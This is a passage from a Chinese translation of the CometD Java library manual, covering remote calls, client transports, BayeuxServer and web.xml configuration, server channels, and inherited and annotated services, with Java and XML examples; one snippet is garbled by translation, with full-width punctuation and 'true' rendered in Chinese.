客户端只需要调用服务器执行某些操作，而不是向其他客户端发送消息时，就会使用远程调用。

典型的用法如下：

	ClientSession client = ...;
	client.handshake();

	...
	Object data = ...;
	client.remoteCall("target", data, new MessageListener() {
    	@Override
    	public void onMessage(Message message) {
        	if (message.isSuccessful()) {
            	String result = (String)message.getData();
            	// Use the result.
        	} else {
            	// Remote call failed.
        	}
    	}
	}

remoteCall（）的第一个参数是远程调用的目标。 您可以将其视为在服务器上调用的方法名称，或者您可以将其视为您要执行的操作。 它可能有也可能没有前导/字符，并可能由多个部分组成，如目标/子目标。 如本节所述，它必须匹配使用@RemoteCall注释的服务器端服务。

remoteCall（）的第二个参数是一个包含远程调用参数的对象。 您可以将其视为远程方法调用的参数，将其指定为对象，或者您可以将其视为执行操作所需的数据。

remoteCall（）的第三个参数是当远程调用返回时，或者当它失败时（例如由于网络故障）调用的回调，以及响应消息。 服务器通过RemoteCall.Caller.result（）或RemoteCall.Caller.failure（）返回的数据将在响应消息中提供。

####9.2.3.4. 使用二进制数据远程调用


与使用二进制数据发布消息类似，可以使用二进制数据执行远程调用。

请记住，您必须在二进制扩展章节中指定的客户端中启用二进制扩展。

这是一个发送ByteBuffer的例子：
	ClientSession client = ...;
	client.handshake();

	ByteBuffer buffer = ...;
	client.remoteCall("target", new BinaryData(buffer, true, null), new MessageListener() {
    	@Override
    	public void onMessage(Message message) {
        	if (message.isSuccessful()) {
            	// Use the result.
        	} else {
            	// Remote call failed.
        	}
    	}
	}

###9.2.4. 断开

断开连接非常简单：

	BayeuxClient client = ...;
	client.disconnect();

像其他API一样，您可以传递一个回调MessageListener来通知服务器收到并处理了断开连接请求：

	BayeuxClient client = ...;
	client.disconnect(new ClientSessionChannel.MessageListener() {
    	public void onMessage(ClientSessionChannel channel, Message message) {
        	if (message.isSuccessful()) {
            	// Server processed the disconnect request.
        	}
    	}
	});

或者，您可以等待断开连接完成：

	BayeuxClient client = ...;
	client.disconnect();
	client.waitFor(1000, BayeuxClient.State.DISCONNECTED);

###9.2.5. 客户端传输

您可以配置org.cometd.client.BayeuxClient类以使用多个传输。 它目前支持长轮询传输（反过来依赖于Jetty的异步HttpClient）和websocket传输（反过来依赖于Jetty的异步WebSocketClient）。

有两个可用的WebSocket传输：

- 一个基于JSR 356，命名为org.cometd.websocket.client.WebSocketTransport的标准Java WebSocket APIs，并由工件org.cometd.java:cometd-java-websocket-javax-client提供
- 一个基于名为org.cometd.websocket.client.JettyWebSocketTransport并由工件org.cometd.java:cometd-java-websocket-jetty-client提供的Jetty WebSocket API

您应该在长轮询传输之前使用websocket传输配置BayeuxClient，以便在WebSocket传输失败时BayeuxClient可以回退到长轮询。 您可以通过在BayeuxClient构造函数的HTTP传输之前列出WebSocket传输来实现，例如：

	// Prepare the JSR 356 WebSocket transport
	WebSocketContainer webSocketContainer = ContainerProvider.getWebSocketContainer();

	// The WebSocketContainer must be started, but JSR 356 APIs do not define any
	// lifecycle APIs, so a Jetty specific cast would be required.
	// However, this is avoidable by piggybacking on HttpClient like shown below.
	// ((LifeCycle)webSocketContainer).start();

	ClientTransport wsTransport = new WebSocketTransport(null, null, webSocketContainer);

	// Prepare the HTTP transport
	HttpClient httpClient = new HttpClient();

	// Add the webSocketContainer as a dependent bean of HttpClient
	// so that it follows HttpClient's lifecycle.
	httpClient.addBean(webSocketContainer, true);
	httpClient.start();

	ClientTransport httpTransport = new LongPollingTransport(null, httpClient);

	// Configure the BayeuxClient, with the websocket transport listed before the http transport
	BayeuxClient client = new BayeuxClient("http://localhost:8080/cometd", wsTransport, httpTransport);

	// Handshake
	client.handshake();

总是建议在没有后备传输（例如LongPollingTransport）的情况下永远不要使用WebSocket传输。 这是您配置Jetty WebSocket传输的方式：

	// Prepare the Jetty WebSocket transport
	WebSocketClient webSocketClient = new WebSocketClient();
	webSocketClient.start();
	ClientTransport wsTransport = new JettyWebSocketTransport(null, null, webSocketClient);

	// Prepare the HTTP transport
	HttpClient httpClient = new HttpClient();
	httpClient.start();
	ClientTransport  httpTransport = new LongPollingTransport(null, httpClient);

	// Configure the BayeuxClient, with the websocket transport listed before the http transport
	BayeuxClient client = new BayeuxClient("http://localhost:8080/cometd", wsTransport, httpTransport);

	// Handshake
	client.handshake();

###9.2.5.1. 客户端传输配置

BayeuxClient使用的传输可以配置多个参数。 您可以在下面找到所有传输通用的参数，以及每个传输特有的参数。

Table 1. Client Transports Common Parameters

| 参数名称        | 是否必须	    |默认值	    |参数描述
| --------   | -----:   | :----: |:----: 
| jsonContext| no      |  org.cometd.common.JettyJSONContextClient|JSONContext.Client 类名 (参照 JSON 章节)

Table 2. 长轮询客户端传输参数

| 参数名称        | 是否必须	    |默认值	    |参数描述
| --------   | -----:   | :----: |:----: 
| maxNetworkDelay| no      |  HttpClient request timeout|在考虑请求Bayeux服务器之前，等待失败的最大毫秒数
| maxMessageSize| no      |  	1048576|HTTP响应的最大字节数，可能包含许多Bayeux消息
| maxBufferSize| no      |  |已弃用，请改用maxMessageSize

Table 3. WebSocket客户端传输参数

| 参数名称        | 是否必须	    |默认值	    |参数描述
| --------   | -----:   | :----: |:----: 
| maxNetworkDelay| no      |  15000|在考虑请求Bayeux服务器之前，等待失败的最大毫秒数
| connectTimeout| no      |  30000|等待WebSocket连接打开的最大毫秒数
| idleTimeout| no      |  60000|WebSocket连接在关闭之前保持空闲的最大毫秒数
| maxMessageSize| no      |  8192|每个WebSocket消息允许的最大字节数（每个WebSocket消息可能携带多个Bayeux消息）
| stickyReconnect| no      |  true|在WebSocket传输能够成功连接到服务器之后检测到WebSocket传输失败时是否坚持使用WebSocket传输

####9.2.5.2. 长轮询运输相关性
如果您使用Maven构建应用程序（推荐的方式），那么您的应用程序只需声明以下依赖项：

- org.cometd.java:cometd-java-client（Maven自动提取cometd-java-client工件所需的Jetty依赖项）。
- 如org.slf4j：slf4j-simple（推荐：org.slf4j：slf4j-log4j12或ch.qos.logback：logback-classic）。
利用这些依赖关系，您可以使用开箱即用的长轮询运输。

####9.2.5.3. WebSocket传输依赖关系
JSR 356 WebSocket传输的依赖关系是：
- org.cometd.java:cometd-java-websocket-javax-client（和传递依赖）
- 如org.slf4j：slf4j-simple（推荐：org.slf4j：slf4j-log4j12或ch.qos.logback：logback-classic）。

Jetty WebSocket传输的依赖关系是：

- org.cometd.java:cometd-java-websocket-jetty-client（和传递依赖）

- 如org.slf4j：slf4j-simple（推荐：org.slf4j：slf4j-log4j12或ch.qos.logback：logback-classic）。

Maven会自动拉取每个构件所需的传递依赖关系。

9.3. 服务器库
------------

要运行CometD服务器实现，您需要将Java Web应用程序部署到Servlet容器。

您可以使用解释Bayeux协议的CometD servlet来配置Web应用程序（另请参阅CometD servlet配置详细信息的服务器配置部分）。

虽然CometD解释Bayeux消息，但应用程序通常实现自己的业务逻辑，因此它们需要能够与Bayeux消息进行交互 - 检查它们，修改它们，在不同渠道上发布更多消息，并与外部系统（如Web服务或持久性 存储。

为了实现他们自己的业务逻辑，应用程序需要编写一个或多个用户定义的服务，另请参阅服务部分，它可以在接收Bayeux频道上的消息时采取行动。

以下各节介绍有关Java Server API及其实现的详细信息。

###9.3.1. 配置Java服务器

您可以在web.xml中指定BayeuxServer参数和服务器传输参数作为org.cometd.server.CometDServlet的初始参数。 如果CometD servlet创建BayeuxServer实例，则servlet init参数将传递给BayeuxServer实例，该实例又配置服务器传输。

如果你按照入门，Maven已经为你配置了web.xml文件; 这里是详细的配置，一个示例web.xml：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
         	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         	xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
         	version="3.0">

    	<servlet>
        	<servlet-name>cometd</servlet-name>
        	<servlet-class>org.cometd.server.CometDServlet</servlet-class>
        	<init-param>
            	<param-name>timeout</param-name>
            	<param-value>60000</param-value>
        	</init-param>
        	<load-on-startup>1</load-on-startup>
        	<async-supported>true</async-supported>
    	</servlet>
    	<servlet-mapping>
        	<servlet-name>cometd</servlet-name>
        	<url-pattern>/cometd/*</url-pattern>
    	</servlet-mapping>

	</web-app>

您必须在web.xml中定义并映射org.cometd.server.CometDServlet以使服务器能够解释Bayeux协议。 它通常映射到/ cometd / *，但如果您愿意，您可以更改url-pattern映射，或者甚至可以有多个映射。

###9.3.2. 配置BayeuxServer

以下是BayeuxServer实现接受的配置初始化参数列表：

Table 4. BayeuxServer 配置参数

| 参数名称    |默认值	|参数描述
| --------   | :----: |:----: 
| allowedTransports| ""| 允许使用逗号分隔的ServerTransport名称列表。 如果未指定，则允许使用默认的服务器传输。
| broadcastToPublisher| true| 当发布者也订阅了它发布的消息时，该参数控制BayeuxServer是否应该将消息广播给所有订阅者（包括发布者），或者仅向其他订阅者广播。
| jsonContext| org.cometd.server.JettyJSONContextServer| 实现org.cometd.common.JSONContext.Server的类的全限定名称。 该类使用默认构造函数加载并实例化。
| transports| ""| 用于定义服务器传输的ServerTransport实现类名称（以org.cometd.server.BayeuxServerImpl作为唯一构造函数参数）的逗号分隔列表。
| validateMessageFields| true| 是否应验证消息字段（如频道，标识和订阅）是否包含Bayeux规范中定义的合法字符。
| sweepPeriod| 997|  服务器执行的清扫活动的时间段（以毫秒为单位）。

####9.3.2.1. 配置服务器传输

CometD服务器传输是可插拔的; CometD实现提供了常用的传输，例如HTTP或WebSocket，但是你可以自己编写。 您可以使用参数来配置服务器传输，这些参数可能有一个指定参数所指的传输的前缀。

例如，参数timeout没有前缀，因此它对所有传输都有效; 参数callback-polling.jsonp.timeout仅覆盖回调轮询传输的超时参数，而ws.timeout覆盖websocket传输的参数（有关详细信息，请参阅org.cometd.bayeux.Transport javadocs）。

以下是不同服务器传输接受的配置初始化参数（将在web.xml中指定）的列表：

Table 5. ServerTransport通用配置参数


| 参数名称    |默认值	|参数描述
| --------   | :----: |:----: 
| timeout| 30000| 以毫秒为单位的服务器等待消息的时间，然后回复/ meta / connect并返回空的答复。
| interval| 0| 客户端在一个/元/连接请求结束和下一个请求开始之间必须等待的时间（以毫秒为单位）。
| maxInterval| 10000| 在客户端被认为无效并被删除之前，服务器等待来自客户端的新/元/连接消息的最长时间（以毫秒为单位）。
| maxProcessing|-1| 在考虑会话无效并将其删除之前，服务器等待处理消息的最长时间（以毫秒为单位）。 负值意味着永远等待。
| maxLazyTimeout|5000| 服务器在交付或发布懒惰消息之前等待的最长时间（以毫秒为单位）。
| metaConnectDeliverOnly|false| 运输是否应该仅通过/ meta / connect传递消息（支持服务器到客户端的严格消息排序 - 但不是可靠性）。 启用此选项允许服务器到客户端的严格消息排序，代价是略微更加烦琐的协议（因为通过/ meta / connect进行传递可能需要唤醒未决应答）。
| maxQueue| -1| ServerSession队列的最大大小。 值-1意味着没有队列大小限制。 当超过最大队列大小时，正值会触发org.cometd.bayeux.server.ServerSession.MaxQueueListener的调用。
| maxMessageSize| <impl>| 传入传输消息（HTTP正文或WebSocket消息 - 都可能包含多个Bayeux消息）的最大大小（以字节为单位）。 默认值取决于传输实现。



Table6.长轮询和回调轮询ServerTransport配置参数

| 参数名称    |默认值	|参数描述
| --------   | :----: |:----: 
| maxSessionsPerBrowser| 1| 允许使用HTTP / 1.1协议从同一浏览器长时间轮询的会话（标签/帧）的最大数量; 负值允许无限制会话（另见本节）。
| http2MaxSessionsPerBrowser| -1| 会话（标签/帧）的最大数量允许使用HTTP / 2协议从同一浏览器进行长时间轮询; 负值允许无限制会话（另见本节）。
| multiSessionInterval| 2000| 以毫秒为单位的时间段，指定客户端正常轮询周期，以防服务器检测到的连接数超过maxSessionsPerBrowser参数允许的更多会话（标签/帧）。 非正值意味着额外的会话被断开。
| browserCookieName|BAYEUX_BROWSER| 用于标识多个会话的cookie的名称（另请参阅本节）。
| browserCookieDomain|| 用于识别多个会话的cookie的域（另请参阅本节）。 默认情况下不存在域。
| browserCookiePath|/| 用于识别多个会话的cookie路径（另请参阅本节）。
| browserCookieSecure| false| 是否将安全属性添加到用于标识多个会话的cookie（另请参阅本节）。
| browserCookieHttpOnly| true| 是否将HttpOnly属性添加到用于标识多个会话的cookie（另请参阅本节）。

Table7.WebSocket ServerTransport配置参数

| 参数名称    |默认值	|参数描述
| --------   | :----: |:----: 
| ws.cometdURLMapping| | 强制性。 由CometD Servlet的servlet映射定义的逗号分隔的url-pattern字符串列表。
| ws.messagesPerFrame| 1| 每个WebSocket帧应该发送多少个Bayeux消息。 将此参数设置得太高可能会导致WebSocket帧被收件人拒绝，因为它们太大。
| ws.bufferSize| impl| 用于读写WebSocket帧的缓冲区的大小（以字节为单位）。 默认值取决于实施。 对于Jetty WebSocket实现，此值为4096。
| ws.idleTimeout|impl|WebSocket连接的空闲超时（以毫秒为单位）。 默认值取决于实施。 对于Jetty WebSocket实现，此值为300000。
| ws.requireHandshakePerConnection|false| 无论每个新的WebSocket连接需要握手，请参阅安全部分。
| ws.enableExtension.<extension_name>|true|  如果客户端和服务器可以协商，是否应该启用带给定扩展名的WebSocket扩展（例如ws.enableExtension.permessage-deflate）。 如果客户端或服务器不支持该分机，则无法协商该分机，并且此选项不起作用。 否则，客户机和服务器都支持该扩展，只有当该选项评估为真时（即，该选项不存在或显式设置为真），才会协商该扩展; 如果此选项评估为false，则不会协商扩展。


####9.3.2.2. 配置CrossOriginFilter

独立于您正在使用的Servlet容器，Jetty提供了一个标准的，便携式的org.eclipse.jetty.servlets.CrossOriginFilter。 此过滤器实现了跨源资源共享规范，并允许实现它的最新浏览器执行跨域JavaScript请求（另请参阅JavaScript传输部分）。

以下是CrossOriginFilter的web.xml配置示例：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
         	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         	xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
         	version="3.0">

    	<servlet>
        	<servlet-name>cometd</servlet-name>
        	<servlet-class>org.cometd.server.CometDServlet</servlet-class>
        	<init-param>
            	<param-name>timeout</param-name>
            	<param-value>60000</param-value>
        	</init-param>
        	<load-on-startup>1</load-on-startup>
        	<async-supported>true</async-supported>
    	</servlet>
    	<servlet-mapping>
        	<servlet-name>cometd</servlet-name>
        	<url-pattern>/cometd/*</url-pattern>
    	</servlet-mapping>

    	<filter>
        	<filter-name>cross-origin</filter-name>
        	<filter-class>org.eclipse.jetty.servlets.CrossOriginFilter</filter-class>
        <async-supported>true</async-supported>
    	</filter>
    	<filter-mapping>
        	<filter-name>cross-origin</filter-name>
        	<url-pattern>/cometd/*</url-pattern>
    	</filter-mapping>

	</web-app>

有关过滤器配置，请参阅Jetty Cross Origin Filter文档。

####9.3.2.3。 配置Servlet 3异步功能

CometD库使用标准的Servlet 3 API,可通过Servlet容器移植。

要启用Servlet 3异步功能，您需要：
- 确保在web.xml中web-app元素的version属性是3.0 <1>。
- 将支持异步的元素添加到可能在CometDServlet和CometDServlet本身<2>之前执行的过滤器。
>注意
>请记得始终为CometD Servlet指定load-on-startup元素。

例如：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
         	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         	xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
         	version="3.0"> 

    	<servlet>
        	<servlet-name>cometd</servlet-name>
        	<servlet-class>org.cometd.server.CometDServlet</servlet-class>
        	<load-on-startup>1</load-on-startup>
        	<async-supported>true</async-supported> 
    	</servlet>
    	<servlet-mapping>
        	<servlet-name>cometd</servlet-name>
        	<url-pattern>/cometd/*</url-pattern>
    	</servlet-mapping>

    	<filter>
        	<filter-name>cross-origin</filter-name>
        	<filter-class>org.eclipse.jetty.servlets.CrossOriginFilter</filter-class>
        <async-supported>true</async-supported> 
    	</filter>
    	<filter-mapping>
        	<filter-name>cross-origin</filter-name>
        	<url-pattern>/cometd/*</url-pattern>
    	</filter-mapping>

	</web-app>

如果您不启用Servlet 3异步功能，则会出现的典型错误如下

IllegalStateException：该servlet不支持此请求的异步操作

>注意
>虽然Jetty默认配置了允许CometD运行立刻使用的非阻塞连接器，但默认情况下，Tomcat 7未配置非阻塞连接器。 您必须先启用Tomcat 7中的非阻塞连接器才能使CometD正常工作。 请参阅Tomcat文档以了解如何在Tomcat中配置非阻塞连接器。

####9.3.2.4. 配置ServerChannel

服务器通道用于向多个客户端广播消息，并且是CometD的核心概念（另请参阅概念部分）。 Class org.cometd.bayeux.server.ServerChannel表示服务器通道;服务器通道的实例可以从BayeuxServer实例中获得。

使用默认的安全策略，可以简单地通过发布到频道来创建服务器频道：如果频道不存在，则可以即时创建。这可能会打开创建大量的服务器通道，例如，当消息发布到使用随机名称（例如/ topic / atyd9834o329）创建的通道以及通道创建期间的竞争条件时（由于相同的服务器通道可能是由同时发布到该频道的两个远程客户端同时创建）。

为了避免这些瞬时服务器通道无限增长并占用大量内存，CometD服务器积极扫描服务器通道，删除应用程序未使用的所有通道。扫描周期可以通过sweepPeriod参数进行控制，请参阅配置BayeuxServer。

鉴于上述情况，您需要解决两个问题：

- 如何自动创建和配置服务器通道
- 如何避免应用程序知道他们将在以后使用的频道被过早地扫描

CometD API为解决第一个问题提供的解决方案是提供一种自动创建和初始化服务器通道的方法：
	
	BayeuxServer bayeuxServer = ...;
	MarkedReference<ServerChannel> ref = bayeuxServer.createChannelIfAbsent("/my/channel", new ServerChannel.Initializer() {
    	public void configureChannel(ConfigurableServerChannel channel) {
        	// Here configure the channel
    	}
	});

方法BayeuxServer.createChannelIfAbsent（String channelName，Initializer ... initializers）自动创建通道，并返回一个MarkedReference，其中包含ServerChannel引用和一个指示通道是否已创建或已存在的布尔值。 只有在通过调用BayeuxServer.createChannelIfAbsent（）创建通道时才调用Initializer回调函数。

解决第二个问题的方法是将通道配置为持久通道，以便扫除器不会删除通道：

	BayeuxServer bayeuxServer = ...;
	MarkedReference<ServerChannel> ref = bayeuxServer.createChannelIfAbsent("/my/channel", new ServerChannel.Initializer() {
    	public void configureChannel(ConfigurableServerChannel channel) {
        	channel.setPersistent(true);
    	}
	});

您不仅可以将ServerChannel实例配置为持久的，而且可以是懒惰的（请参阅本节），您可以添加侦听器，并且可以添加授权者（另请参阅授权者部分）。

创建服务器通道将返回一个MarkedReference，其中包含ServerChannel引用和一个布尔值，用于指示通道是已创建还是已经存在：

	BayeuxServer bayeuxServer = ...;
	String channelName =“/ my / channel”;
	MarkedReference <ServerChannel> ref = bayeuxServer.createChannelIfAbsent（channelName，new ServerChannel.Initializer（）{
     	public void configureChannel（ConfigurableServerChannel channel）{
        		channel.setPersistent（真）;
    		}
	}）;

	//通道是由这个线程自动创建的吗？
	boolean created = ref.isMarked（）;

	//保证永不为空：要么是频道
	//刚刚创建，或者它已经同时创建
	//通过其他线程。
	ServerChannel channel = ref.getReference（）;

上面的代码创建通道，将其配置为持久性的，然后获取对其的引用，该引用保证为非空。

CometD应用程序中的一个典型错误是创建通道而不使其持久化，然后尝试获取对其的引用而不检查它是否为空：

	BayeuxServer bayeuxServer = ...;
	String channelName = "/my/channel";

	// Wrong, channel not marked as persistent, but used later
	bayeuxServer.createChannelIfAbsent(channelName);

	// Other application code here

	ServerChannel channel = bayeuxServer.getChannel(channelName);
	channel.publish(...); // May throw NullPointerException

在BayeuxServer.createChannelIfAbsent（）调用和BayeuxServer.getChannel（）调用之间，有可能需要一段时间才能完成的应用程序代码（因此允许清扫程序扫描刚创建的服务器通道），因此标记通道总是比较安全的 作为持久性，当不再需要时，将服务器通道标记为非持久性（通过调用channel.setPersistent（false）），以允许清扫器清除它。

服务器通道清理器将扫描非持久性通道，没有订阅者，没有听众，没有授权者并且没有子通道，并且只有在连续三次清扫通道满足这些条件之后。

###9.3.3. 使用服务

CometD服务是一个Java类，它允许开发人员指定在Bayeux渠道接收Bayeux消息时运行的代码。 当消息到达服务实例订阅的通道时，CometD调用回调方法来执行用户特定的代码。

CometD服务可以有两种：
- 继承
- 注释

如Spring框架集成部分所述，您也可以将CometD服务与Spring框架集成。

以下各节介绍有关Java服务器服务的详细信息。

####9.3.3.1. 继承服务

CometD继承的服务是一个Java类，它扩展了CometD类org.cometd.server.AbstractService，该类指定服务感兴趣的Bayeux渠道，并遵守AbstractService类定义的合同：

	public class EchoService extends AbstractService { 1
    	public EchoService(BayeuxServer bayeuxServer) { 2
        	super(bayeuxServer, "echo"); 3
        	addService("/echo", "processEcho"); 4
    	}

    	public void processEcho(ServerSession remote, ServerMessage message) { 5
        	remote.deliver(getServerSession(), "/echo", message.getData()); 6
    	}
	}

这是一个简单的echo服务，它将远程客户端在通道/ echo上发送的消息返回给远程客户端。 注意以下几点：

1. 从org.cometd.server.AbstractService扩展
2. 创建一个采用org.cometd.bayeux.server.BayeuxServer对象的构造函数。
3. 调用超类构造函数，传递BayeuxServer对象和服务的任意名称，在本例中为“echo”。
4. 订阅通道/回显，并指定通过addService（...）在消息到达该通道时必须调用的方法的名称。
5. 定义（4）中指定的具有相同名称的方法，并具有适当的签名（请参见下文）。
6. 使用org.cometd.bayeux.server.ServerSession API将消息回送给该特定客户端。

BayeuxService类用于回调方法的合约是这些方法必须具有以下签名：

	public void processEcho(ServerSession remote, ServerMessage message)

请注意，addService（）方法中指定的通道名称可能是通配符，例如：

	public class BaseballTeamService extends AbstractService {
    	public BaseballTeamService(BayeuxServer bayeux) {
        	super(bayeux, "baseballTeam");
        	addService("/baseball/team/*", "processBaseballTeam");
    	}

    	public void processBaseballTeam(ServerSession remote, ServerMessage message) {
        	// Upon receiving a message on channel /baseball/team/*, forward to channel /events/baseball/team/*
        	getBayeux().getChannel("/events" + message.getChannel()).publish(getServerSession(), message.getData());
    	}
	}

还要注意第一个示例如何使用ServerSession.deliver（）向特定远程客户端发送消息，而第二个示例使用ServerChannel.publish（）向订阅channel / events / baseball / team / *的任何人发送消息。

方法addService（...）用于将服务器端通道侦听器与每次消息到达通道时调用的方法进行映射。 单个服务具有多个映射并不罕见，并且映射甚至可以被动态地添加和移除：

	public class GameService extends AbstractService {
    	public GameService(BayeuxServer bayeux) {
        	super(bayeux, "game");
        	addService("/service/game/*", "processGameCommand");
        	addService("/game/event", "processGameEvent");
    	}

    	public void processGameCommand(ServerSession remote, ServerMessage 	message) {
        	GameCommand command = (GameCommand)message.getData();
        	switch (command.getType()) {
            	case GAME_START: {
                	addService("/game/" + command.getGameId(), "processGame");
                	break;
            	}
            	case GAME_END: {
                	removeService("/game/" + command.getGameId());
                	break;
            	}
            	...
        	}
    	}

    	public void processGameEvent(ServerSession remote, ServerMessage message) 	{
        	...
    	}

    	public void processGame(ServerSession remote, ServerMessage message) {
        	...
    	}
	}

注意如何使用removeService（）方法删除映射。

每次创建服务实例时，都会在服务本身中创建关联的LocalSession（请参阅本节）：服务是本地客户端。 LocalSession有一个关联的ServerSession，因此它被服务器以与远程客户端（也在服务器内创建ServerSession）相同的方式处理。 LocalSession和ServerSession可分别通过AbstractService方法getLocalSession（）和getServerSession（）访问。

>注意
>>如果服务方法引发异常，它会被CometD实现捕获，并在INFO级别登录到与服务的类名对应的记录器类别，CometD不会采取进一步的操作。

一旦编写了Bayeux服务，就可以在Web应用程序中进行设置，请参阅服务集成部分或Spring Framework服务集成部分。

####9.3.3.2.注释客户端和服务器端服务

用@Service注解的类在客户端和服务器端都可以作为带注释的服务。

####9.3.3.3.服务器端注释服务

服务器端注释服务通过使用org.cometd.annotation包中的注释注释类，字段和方法来定义。

继承服务提供的功能可用于注释服务，尽管方式稍有不同。

服务器端继承的服务通过扩展org.cometd.server.AbstractService类来编写，并且这些类的实例通常具有单例语义，并在Web应用程序启动时创建和配置。通过使用@Service注释一个类，您可以获得相同的功能。

org.cometd.server.AbstractService类提供（通过继承）一些在实现服务时很有用的工具，包括访问与服务实例关联的ServerSession。通过使用@Session注释字段，您可以获得相同的功能。

服务器端继承的服务提供了将方法注册为回调以接收来自通道的消息的方法。通过使用@Listener或@Subscription注释方法，您可以获得相同的功能。

服务可能依赖于其他服务（例如，访问数据库的数据源），并可能需要生命周期管理（即服务具有必须在适当时间调用的start（）/ stop（）方法）。在扩展org.cometd.server.AbstractService的服务中，依赖注入和生命周期管理必须手工编写在配置servlet或配置监听器中。通过使用标准JSR 330 @Inject注释或标准JSR 250 @PostConstruct和@PreDestroy注释来注释字段，您将获得相同的功能。

服务器端注释服务提供对CometD功能的全面支持，并通过org.cometd.annotation.ServerAnnotationProcessor类对依赖注入和生命周期管理提供有限的支持。

带注释的服务实例存储在对应于其全限定类名的键下的servlet上下文中。

####9.3.3.4.依赖注入支持

CometD项目对依赖注入提供了有限的支持，因为通常这是通过Spring，Guice或CDI等其他框架完成的。

特别是，它仅支持在字段和方法（而不是构造函数）上注入BayeuxServer对象，并且仅在注入尚未执行时才执行注入。

这种有限的支持的原因是CometD项目不想实现和支持通用的依赖注入容器，而是提供与现有依赖注入容器的简单集成以及对所需CometD对象的最小支持（如BayeuxServer实例） 。

**注释样式**
  
	@org.cometd.annotation.Service("echoService")
	public class EchoService {
    	@javax.inject.Inject
    	private BayeuxServer bayeux;
	}

**继承样式**

	public class EchoService extends AbstractService {
    	public EchoService(BayeuxServer bayeux) {
        	super(bayeux, "echoService");
    	}
	}

服务类用@Service注释，并指定（可选）服务名称“echoService”。 BayeuxServer字段使用标准JSR 330 @Inject注释进行注释。 JSR 330指定的标准依赖注入支持@Inject注解（例如，Spring 3或更高版本）。

####9.3.3.5.生命周期管理支持

CometD项目通过标准JSR 250 @PostConstruct和@PreDestroy注释提供生命周期管理。 CometD为那些不使用依赖注入容器进行生命周期管理的人提供这种支持，如Spring。

####9.3.3.6.通道配置支持

要初始化的通道，才可以进行订阅实际引用的的cometd API提供了BayeuxServer.createChannelIfAbsent（字符串的channelID，ConfigurableServerChannel.Initializer ...初始化）方法，它允许你传递配置给定信道初始化。此外，在添加任何订阅或侦听器之前为频道设置配置步骤非常有用，例如，在频道上配置授权人（另请参阅授权人部分。

在注释服务中，您可以在方法上使用@Configure注释：

	@Service("echoService")
	public class EchoService {
    	@Inject
    	private BayeuxServer bayeux;

    	@Configure("/echo")
    	public void configure(ConfigurableServerChannel channel) {
        	channel.setLazy(true);
        	channel.addAuthorizer(GrantAuthorizer.GRANT_PUBLISH);
    	}
	}

####9.3.3.7.会话配置支持

扩展org.cometd.server.AbstractService的服务有两个访问LocalSession和ServerSession的设施方法，即getLocalSession（）和getServerSession（）。

在注释服务中，这是通过@Session注释完成的：

	@Service("echoService")
	public class EchoService {
    	@Inject
    	private BayeuxServer bayeux;

    	@org.cometd.annotation.Session
    	private LocalSession localSession;

    	@org.cometd.annotation.Session
    	private ServerSession serverSession;
	}

用@Session注释标注的字段（或方法）是可选的; 您可以只拥有LocalSession字段，或者只有ServerSession字段，或两者都没有，具体取决于您是否需要它们。

您不能使用@Inject注入会话字段（或方法）。 这是因为LocalSession对象和ServerSession对象是相关的，并且绑定到特定的服务实例。 使用通用注入机制可能会导致混淆（例如，在两个不同的服务中使用相同的会话）。

####9.3.3.8. 监听器配置支持

对于服务器端服务，用@Listener注释的方法表示在服务器端处理消息期间调用的回调函数。 由@Listener注释指定的频道可能是模板频道。

CometD实现使用以下参数调用@Listener方法：

- 发送消息的ServerSession半对象。



- 服务器正在处理的ServerMessage。



- 零个或多个String参数对应于通道参数。

回调方法必须具有以下签名或其协变版本：

**注释样式**

	@Service("echoService")
	public class EchoService {
    	@Inject
    	private BayeuxServer bayeux;
    	@Session
    	private ServerSession serverSession;

    	@org.cometd.annotation.Listener("/echo")
    	public void echo(ServerSession remote, ServerMessage.Mutable message) {
        	String channel = message.getChannel();
        	Object data = message.getData();
        	remote.deliver(serverSession, channel, data);
    	}
	}

**继承样式**

	public class EchoService extends AbstractService {
    	public EchoService(BayeuxServer bayeux) {
        	super(bayeux, "echoService");
        	addService("/echo", "echo");
    	}

    	public void echo(ServerSession remote, ServerMessage.Mutable message) {
        	String channel = message.getChannel();
        	Object data = message.getData();
        	remote.deliver(getServerSession(), channel, data);
    	}
	}

回调方法可以返回false以指示不应该执行后续侦听器的处理，并且不应该发布该消息。

>注意
>>如果回调方法引发异常，它会被CometD实现捕获，并在INFO级别登录到与服务的类名对应的记录器类别，CometD不会采取进一步的操作。

由@Listener注释指定的频道可能是模板频道。 在这种情况下，您必须将相应数量的参数（类型为String）添加到service方法的签名中，并使用@ org.cometd.annotation.Param注释每个附加参数，确保将参数名称与通道参数 和@Param注释以相同的顺序排列：

	@Service
	public class ParametrizedService {
    	@Listener("/news/{category}/{event}")
    	public void serviceNews(ServerSession remote, ServerMessage message, 	@Param("category") String category, @Param("event") String event) {
        	...
    	}
	}

>注意
>>注意在@Listener注释中定义的两个通道参数如何在方法签名中有两个附加参数（它们必须添加在ServerSession和ServerMessage参数之后），类型为String并使用@Param注解。 @Param注释必须指定模板通道声明的参数名称。由模板通道定义的参数顺序必须与使用@Param注释的服务方法的参数相同。

>>只有与@Listener定义的模板通道匹配的消息才会传递到服务方法。在上面的例子中，channel / news / weather或/ news / sport / athletics / decathlon的消息不会传送到服务方法，因为这些通道不会与模板通道绑定（分别为太少的段和太多的段），而到/ news / technology / cometd的消息将被传递，类别参数绑定到字符串“technology”并且事件参数绑定到字符串“cometd”。

####9.3.3.9.订阅配置支持

